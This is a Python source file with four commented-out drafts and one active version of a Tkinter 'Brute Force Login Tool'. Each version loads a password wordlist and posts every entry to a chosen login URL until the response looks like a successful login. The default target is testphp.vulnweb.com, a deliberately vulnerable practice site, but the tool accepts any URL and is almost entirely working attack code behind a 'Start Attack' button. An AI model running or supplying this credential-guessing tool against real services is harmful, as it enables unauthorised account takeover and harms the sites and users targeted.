# import tkinter as tk
# from tkinter import filedialog, messagebox, scrolledtext
# import requests
# import os
# import logging

# # ✅ Ensure logs directory exists before setting up logging
# if not os.path.exists("logs"):
#     os.makedirs("logs")

# logging.basicConfig(filename='logs/result.log', level=logging.INFO, format='%(asctime)s - %(message)s')


# def brute_force_login(url, username, password_file, output_widget):
#     output_widget.delete("1.0", tk.END)
#     output_widget.insert(tk.END, "[*] Starting brute force...\n")
#     output_widget.update()

#     try:
#         with open(password_file, 'r') as file:
#             passwords = file.readlines()
#     except:
#         messagebox.showerror("Error", "Could not read password file.")
#         return

#     for password in passwords:
#         password = password.strip()
#         data = {'username': username, 'password': password}

#         try:
#             response = requests.post(url, data=data)
#             if "Welcome" in response.text or response.status_code == 200:
#                 result = f"[+] Password found: {password}\n"
#                 output_widget.insert(tk.END, result)
#                 logging.info(f"Password found: {password}")
#                 return
#             else:
#                 output_widget.insert(tk.END, f"[-] Tried: {password}\n")
#         except Exception as e:
#             output_widget.insert(tk.END, f"[!] Error: {password} -> {e}\n")

#         output_widget.update()

#     output_widget.insert(tk.END, "[x] Password not found in the list.\n")
#     logging.info("Password not found in the list.")


# def browse_file(entry):
#     path = filedialog.askopenfilename(title="Select Password File", filetypes=[("Text Files", "*.txt")])
#     entry.delete(0, tk.END)
#     entry.insert(0, path)


# def start_gui():
#     window = tk.Tk()
#     window.title("Brute Force Login Tool")
#     window.geometry("600x500")
#     window.resizable(False, False)

#     tk.Label(window, text="Target Login URL:").pack(pady=5)
#     url_entry = tk.Entry(window, width=80)
#     url_entry.pack()

#     tk.Label(window, text="Username:").pack(pady=5)
#     username_entry = tk.Entry(window, width=80)
#     username_entry.pack()

#     tk.Label(window, text="Password File Path:").pack(pady=5)
#     pw_frame = tk.Frame(window)
#     pw_frame.pack(pady=5)
#     password_file_entry = tk.Entry(pw_frame, width=60)
#     password_file_entry.pack(side=tk.LEFT)
#     browse_btn = tk.Button(pw_frame, text="Browse", command=lambda: browse_file(password_file_entry))
#     browse_btn.pack(side=tk.LEFT, padx=5)

#     output_text = scrolledtext.ScrolledText(window, height=18, width=70, wrap=tk.WORD)
#     output_text.pack(pady=10)

#     start_btn = tk.Button(window, text="Start Attack", bg="#e74c3c", fg="white",
#                           command=lambda: brute_force_login(
#                               url_entry.get(),
#                               username_entry.get(),
#                               password_file_entry.get(),
#                               output_text
#                           ))
#     start_btn.pack(pady=5)

#     window.mainloop()


# if __name__ == "__main__":
#     start_gui()

# import requests
# from tkinter import *
# from tkinter import filedialog, messagebox, scrolledtext

# def start_attack():
#     url = entry_url.get()
#     username = entry_username.get()
#     password_file = entry_file_path.get()

#     if not url or not username or not password_file:
#         messagebox.showwarning("Missing Info", "Please fill all fields.")
#         return

#     try:
#         with open(password_file, "r") as file:
#             passwords = file.readlines()
#     except Exception as e:
#         messagebox.showerror("Error", f"Could not read password file:\n{e}")
#         return

#     text_output.insert(END, "[*] Starting brute force...\n")
#     for password in passwords:
#         password = password.strip()
#         data = {"username": username, "password": password}
#         response = requests.post(url, data=data)

#         text_output.insert(END, f"Trying: {password}\n")
#         text_output.see(END)
#         text_output.update()

#         if "Welcome" in response.text or "dashboard" in response.text:
#             text_output.insert(END, f"[+] Password found: {password}\n")
#             return

#     text_output.insert(END, "[-] Password not found.\n")

# def browse_file():
#     filename = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
#     if filename:
#         entry_file_path.delete(0, END)
#         entry_file_path.insert(0, filename)

# # GUI Window
# window = Tk()
# window.title("🔐 Brute Force Login Tool")
# window.geometry("600x450")
# window.configure(bg="#f0f0f0")
# window.resizable(False, False)

# # Styling
# font_label = ("Segoe UI", 10)
# font_entry = ("Segoe UI", 10)
# font_button = ("Segoe UI", 10, "bold")

# # URL Input
# Label(window, text="Target Login URL:", font=font_label, bg="#f0f0f0").grid(row=0, column=0, sticky=W, padx=10, pady=5)
# entry_url = Entry(window, width=60, font=font_entry)
# entry_url.grid(row=0, column=1, padx=10, pady=5, columnspan=2)
# entry_url.insert(0, "http://testphp.vulnweb.com/login.php")

# # Username Input
# Label(window, text="Username:", font=font_label, bg="#f0f0f0").grid(row=1, column=0, sticky=W, padx=10, pady=5)
# entry_username = Entry(window, width=30, font=font_entry)
# entry_username.grid(row=1, column=1, padx=10, pady=5, sticky=W)
# entry_username.insert(0, "test")

# # Password File Input
# Label(window, text="Password File Path:", font=font_label, bg="#f0f0f0").grid(row=2, column=0, sticky=W, padx=10, pady=5)
# entry_file_path = Entry(window, width=45, font=font_entry)
# entry_file_path.grid(row=2, column=1, padx=10, pady=5)
# Button(window, text="Browse", font=font_button, command=browse_file, bg="#0078D7", fg="white").grid(row=2, column=2, padx=10)

# # Output Text Area
# text_output = scrolledtext.ScrolledText(window, width=70, height=15, font=("Courier New", 9), bg="#ffffff")
# text_output.grid(row=3, column=0, columnspan=3, padx=10, pady=10)

# # Start Button
# btn_start = Button(window, text="🚀 Start Attack", font=font_button, command=start_attack, bg="#28a745", fg="white", height=2, width=20)
# btn_start.grid(row=4, column=1, pady=10)

# window.mainloop()


# import tkinter as tk
# from tkinter import filedialog, messagebox
# import requests

# def brute_force_login(target_url, username, password_file_path, output_widget, status_label):
#     try:
#         with open(password_file_path, "r") as file:
#             passwords = file.readlines()
#     except:
#         messagebox.showerror("Error", "Could not read password file.")
#         return

#     output_widget.delete(1.0, tk.END)
#     output_widget.insert(tk.END, "[*] Starting brute force...\n")
#     status_label.config(text="Status: Running", fg="orange")

#     for password in passwords:
#         password = password.strip()
#         output_widget.insert(tk.END, f"Trying: {password}\n")
#         output_widget.see(tk.END)
#         output_widget.update()

#         response = requests.post(target_url, data={"uname": username, "pass": password, "login": "submit"})

#         if "Welcome" in response.text or "logout" in response.text:
#             output_widget.insert(tk.END, f"[+] Password found: {password}\n")
#             status_label.config(text=f"Status: Success! Password: {password}", fg="lightgreen")
#             return

#     output_widget.insert(tk.END, "[-] Password not found.\n")
#     status_label.config(text="Status: Failed - Password not found", fg="red")

# def browse_file(entry):
#     filepath = filedialog.askopenfilename()
#     if filepath:
#         entry.delete(0, tk.END)
#         entry.insert(0, filepath)

# def start_attack():
#     url = entry_url.get()
#     user = entry_username.get()
#     password_file = entry_password_file.get()
#     if not url or not user or not password_file:
#         messagebox.showerror("Error", "Please fill in all fields.")
#         return
#     brute_force_login(url, user, password_file, output_text, status_label)

# # --- GUI SETUP ---
# window = tk.Tk()
# window.title("🔒 Brute Force Login Tool - Dark Mode")
# window.geometry("650x450")
# window.configure(bg="#1e1e1e")

# font_label = ("Segoe UI", 10)
# font_entry = ("Segoe UI", 10)
# font_output = ("Consolas", 10)
# font_button = ("Segoe UI", 10, "bold")

# # --- Form Layout ---
# tk.Label(window, text="Target Login URL:", font=font_label, bg="#1e1e1e", fg="white").grid(row=0, column=0, sticky="w", padx=10, pady=5)
# entry_url = tk.Entry(window, width=50, font=font_entry, bg="#2e2e2e", fg="white", insertbackground='white')
# entry_url.grid(row=0, column=1, padx=10, pady=5)
# entry_url.insert(0, "http://testphp.vulnweb.com/login.php")


# tk.Label(window, text="Username:", font=font_label, bg="#1e1e1e", fg="white").grid(row=1, column=0, sticky="w", padx=10, pady=5)
# entry_username = tk.Entry(window, width=30, font=font_entry, bg="#2e2e2e", fg="white", insertbackground='white')
# entry_username.grid(row=1, column=1, padx=10, pady=5, sticky="w")
# entry_username.insert(0, "test")



# # Password file path
# entry_password_file = tk.Entry(window, width=35, font=font_entry, bg="#2e2e2e", fg="white", insertbackground='white')
# entry_password_file.grid(row=2, column=1, padx=10, pady=5, sticky="w")
# tk.Button(window, text="Browse", command=lambda: browse_file(entry_password_file), bg="#007acc", fg="white", bd=0).grid(row=2, column=1, sticky="e", padx=10)
# tk.Label(window, text="Password File Path:", font=font_label, bg="#1e1e1e", fg="white").grid(row=2, column=0, sticky="w", padx=10, pady=5)

# # Output
# output_text = tk.Text(window, height=12, font=font_output, bg="#2e2e2e", fg="lightgreen", insertbackground='white')
# output_text.grid(row=3, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")

# # Start Button
# btn_start = tk.Button(window, text="🚀 Start Attack", font=font_button, command=start_attack,
#                       bg="#28a745", fg="white", height=2, width=20, bd=0, activebackground="#1c7c37", cursor="hand2")
# btn_start.grid(row=4, column=1, pady=10, sticky="e")

# # Hover Effects
# def on_enter(e):
#     btn_start.config(bg="#1c7c37")
# def on_leave(e):
#     btn_start.config(bg="#28a745")
# btn_start.bind("<Enter>", on_enter)
# btn_start.bind("<Leave>", on_leave)

# # Status Label
# status_label = tk.Label(window, text="Status: Idle", font=("Segoe UI", 9), bg="#1e1e1e", fg="gray")
# status_label.grid(row=5, column=0, columnspan=2, pady=5)

# # Responsive resizing
# window.columnconfigure(1, weight=1)
# window.rowconfigure(3, weight=1)

# window.mainloop()




# import tkinter as tk
# from tkinter import filedialog, messagebox
# import requests
# import os
# import ctypes

# # Enable dark title bar on Windows 10+
# def dark_title_bar(window):
#     try:
#         hwnd = ctypes.windll.user32.GetParent(window.winfo_id())
#         value = 1  # True
#         ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, 20, ctypes.byref(ctypes.c_int(value)), 4)
#     except:
#         pass

# # GUI App
# class BruteForceGUI:
#     def __init__(self, root):
#         self.root = root
#         self.root.title("Brute Force Login Tool")
#         self.root.geometry("600x450")
#         self.is_dark_mode = True

#         self.style_dark = {
#             "bg": "#121212",
#             "fg": "#ffffff",
#             "entry_bg": "#1e1e1e",
#             "entry_fg": "#ffffff",
#             "button_bg": "#1f7a8c",
#             "button_fg": "white",
#             "text_bg": "#1e1e1e",
#             "text_fg": "white"
#         }

#         self.style_light = {
#             "bg": "#ffffff",
#             "fg": "#000000",
#             "entry_bg": "#f0f0f0",
#             "entry_fg": "#000000",
#             "button_bg": "#28a745",
#             "button_fg": "white",
#             "text_bg": "#f0f0f0",
#             "text_fg": "black"
#         }

#         self.create_widgets()
#         self.apply_theme()

#     def create_widgets(self):
#         self.frame = tk.Frame(self.root)
#         self.frame.pack(pady=20)

#         self.label_url = tk.Label(self.frame, text="Target Login URL:")
#         self.entry_url = tk.Entry(self.frame, width=50)
#         self.entry_url.insert(0, "http://testphp.vulnweb.com/login.php")

#         self.label_username = tk.Label(self.frame, text="Username:")
#         self.entry_username = tk.Entry(self.frame, width=50)
#         self.entry_username.insert(0, "test")

#         self.label_file = tk.Label(self.frame, text="Password File Path:")
#         self.entry_file = tk.Entry(self.frame, width=40)
#         self.button_browse = tk.Button(self.frame, text="Browse", command=self.browse_file)

#         self.text_output = tk.Text(self.root, height=12, width=70)

#         self.button_start = tk.Button(self.root, text="Start Attack", command=self.start_attack)
#         self.button_theme = tk.Button(self.root, text="🌗", width=3, command=self.toggle_theme)

#         self.label_url.grid(row=0, column=0, sticky="w", padx=5, pady=5)
#         self.entry_url.grid(row=0, column=1, padx=5, pady=5)

#         self.label_username.grid(row=1, column=0, sticky="w", padx=5, pady=5)
#         self.entry_username.grid(row=1, column=1, padx=5, pady=5)

#         self.label_file.grid(row=2, column=0, sticky="w", padx=5, pady=5)
#         self.entry_file.grid(row=2, column=1, padx=5, pady=5, sticky="w")
#         self.button_browse.grid(row=2, column=2, padx=5)

#         self.text_output.pack(pady=10)

#         self.button_start.pack(pady=5)
#         self.button_theme.place(x=560, y=10)

#     def apply_theme(self):
#         theme = self.style_dark if self.is_dark_mode else self.style_light

#         self.root.configure(bg=theme["bg"])
#         self.frame.configure(bg=theme["bg"])
#         self.label_url.configure(bg=theme["bg"], fg=theme["fg"])
#         self.label_username.configure(bg=theme["bg"], fg=theme["fg"])
#         self.label_file.configure(bg=theme["bg"], fg=theme["fg"])

#         entries = [self.entry_url, self.entry_username, self.entry_file]
#         for entry in entries:
#             entry.configure(bg=theme["entry_bg"], fg=theme["entry_fg"], insertbackground=theme["entry_fg"])

#         self.button_browse.configure(bg=theme["button_bg"], fg=theme["button_fg"])
#         self.button_start.configure(bg=theme["button_bg"], fg=theme["button_fg"])
#         self.button_theme.configure(bg=theme["button_bg"], fg=theme["button_fg"])

#         self.text_output.configure(bg=theme["text_bg"], fg=theme["text_fg"], insertbackground=theme["text_fg"])

#         if self.is_dark_mode:
#             dark_title_bar(self.root)

#     def toggle_theme(self):
#         self.is_dark_mode = not self.is_dark_mode
#         self.apply_theme()

#     def browse_file(self):
#         filepath = filedialog.askopenfilename(title="Select Password File")
#         if filepath:
#             self.entry_file.delete(0, tk.END)
#             self.entry_file.insert(0, filepath)

#     def start_attack(self):
#         url = self.entry_url.get()
#         username = self.entry_username.get()
#         file_path = self.entry_file.get()

#         self.text_output.delete("1.0", tk.END)
#         self.text_output.insert(tk.END, "[*] Starting brute force...\n")

#         if not os.path.exists(file_path):
#             self.text_output.insert(tk.END, "[!] Password file not found.\n")
#             return

#         try:
#             with open(file_path, 'r') as file:
#                 for password in file:
#                     password = password.strip()
#                     self.text_output.insert(tk.END, f"Trying: {password}\n")
#                     self.root.update()
#                     data = {'username': username, 'password': password, 'Login': 'Login'}
#                     response = requests.post(url, data=data)
#                     if "logout" in response.text.lower() or "welcome" in response.text.lower():
#                         self.text_output.insert(tk.END, f"[+] Password found: {password}\n")
#                         return
#                 self.text_output.insert(tk.END, "[-] Password not found.\n")
#         except Exception as e:
#             self.text_output.insert(tk.END, f"[!] Error: {str(e)}\n")

# if __name__ == '__main__':
#     root = tk.Tk()
#     app = BruteForceGUI(root)
#     root.mainloop()




import tkinter as tk
from tkinter import filedialog, messagebox
import requests
import os
import ctypes

# Enable dark title bar on Windows 10+
def dark_title_bar(window):
    try:
        hwnd = ctypes.windll.user32.GetParent(window.winfo_id())
        value = 1  # True
        ctypes.windll.dwmapi.DwmSetWindowAttribute(hwnd, 20, ctypes.byref(ctypes.c_int(value)), 4)
    except:
        pass

# GUI App
class BruteForceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Brute Force Login Tool")
        self.root.geometry("600x450")
        self.is_dark_mode = True

        self.style_dark = {
            "bg": "#121212",
            "fg": "#ffffff",
            "entry_bg": "#1e1e1e",
            "entry_fg": "#ffffff",
            "button_bg": "#1f7a8c",
            "button_fg": "white",
            "text_bg": "#1e1e1e",
            "text_fg": "white"
        }

        self.style_light = {
            "bg": "#ffffff",
            "fg": "#000000",
            "entry_bg": "#f0f0f0",
            "entry_fg": "#000000",
            "button_bg": "#28a745",
            "button_fg": "white",
            "text_bg": "#f0f0f0",
            "text_fg": "black"
        }

        self.create_widgets()
        self.apply_theme()

    def create_widgets(self):
        self.frame = tk.Frame(self.root)
        self.frame.pack(pady=20)

        self.label_url = tk.Label(self.frame, text="Target Login URL:")
        self.entry_url = tk.Entry(self.frame, width=50)
        self.entry_url.insert(0, "http://testphp.vulnweb.com/login.php")

        self.label_username = tk.Label(self.frame, text="Username:")
        self.entry_username = tk.Entry(self.frame, width=50)
        self.entry_username.insert(0, "test")

        self.label_file = tk.Label(self.frame, text="Password File Path:")
        self.entry_file = tk.Entry(self.frame, width=40)
        self.button_browse = tk.Button(self.frame, text="Browse", command=self.browse_file)

        self.text_output = tk.Text(self.root, height=12, width=70)

        self.button_start = tk.Button(self.root, text="Start Attack", command=self.start_attack)
        self.button_theme = tk.Button(self.root, text="🌗", width=3, command=self.toggle_theme)

        self.label_url.grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.entry_url.grid(row=0, column=1, padx=5, pady=5)

        self.label_username.grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.entry_username.grid(row=1, column=1, padx=5, pady=5)

        self.label_file.grid(row=2, column=0, sticky="w", padx=5, pady=5)
        self.entry_file.grid(row=2, column=1, padx=5, pady=5, sticky="w")
        self.button_browse.grid(row=2, column=2, padx=5)

        self.text_output.pack(pady=10)

        self.button_start.pack(pady=5)
        self.button_theme.place(x=560, y=10)

    def apply_theme(self):
        theme = self.style_dark if self.is_dark_mode else self.style_light

        self.root.configure(bg=theme["bg"])
        self.frame.configure(bg=theme["bg"])
        self.label_url.configure(bg=theme["bg"], fg=theme["fg"])
        self.label_username.configure(bg=theme["bg"], fg=theme["fg"])
        self.label_file.configure(bg=theme["bg"], fg=theme["fg"])

        entries = [self.entry_url, self.entry_username, self.entry_file]
        for entry in entries:
            entry.configure(bg=theme["entry_bg"], fg=theme["entry_fg"], insertbackground=theme["entry_fg"])

        self.button_browse.configure(bg=theme["button_bg"], fg=theme["button_fg"])
        self.button_start.configure(bg=theme["button_bg"], fg=theme["button_fg"])
        self.button_theme.configure(bg=theme["button_bg"], fg=theme["button_fg"])

        self.text_output.configure(bg=theme["text_bg"], fg=theme["text_fg"], insertbackground=theme["text_fg"])

        if self.is_dark_mode:
            dark_title_bar(self.root)

    def toggle_theme(self):
        self.is_dark_mode = not self.is_dark_mode
        self.apply_theme()

    def browse_file(self):
        filepath = filedialog.askopenfilename(title="Select Password File")
        if filepath:
            self.entry_file.delete(0, tk.END)
            self.entry_file.insert(0, filepath)

    def start_attack(self):
        url = self.entry_url.get()
        username = self.entry_username.get()
        file_path = self.entry_file.get()

        self.text_output.delete("1.0", tk.END)
        self.text_output.insert(tk.END, "[*] Starting brute force...\n")

        if not os.path.exists(file_path):
            self.text_output.insert(tk.END, "[!] Password file not found.\n")
            return

        try:
            with open(file_path, 'r') as file:
                for password in file:
                    password = password.strip()
                    self.text_output.insert(tk.END, f"Trying: {password}\n")
                    self.root.update()
                    data = {'username': username, 'password': password, 'Login': 'Login'}
                    headers = {'User-Agent': 'Mozilla/5.0'}
                    try:
                        response = requests.post(url, data=data, headers=headers, timeout=10)
                        if "Invalid" not in response.text:
                            self.text_output.insert(tk.END, f"[+] Password found: {password}\n")
                            return
                    except requests.exceptions.RequestException as e:
                        self.text_output.insert(tk.END, f"[!] Request error: {str(e)}\n")
                        return
                self.text_output.insert(tk.END, "[-] Password not found.\n")
        except Exception as e:
            self.text_output.insert(tk.END, f"[!] Error: {str(e)}\n")

if __name__ == '__main__':
    root = tk.Tk()
    app = BruteForceGUI(root)
    root.mainloop()
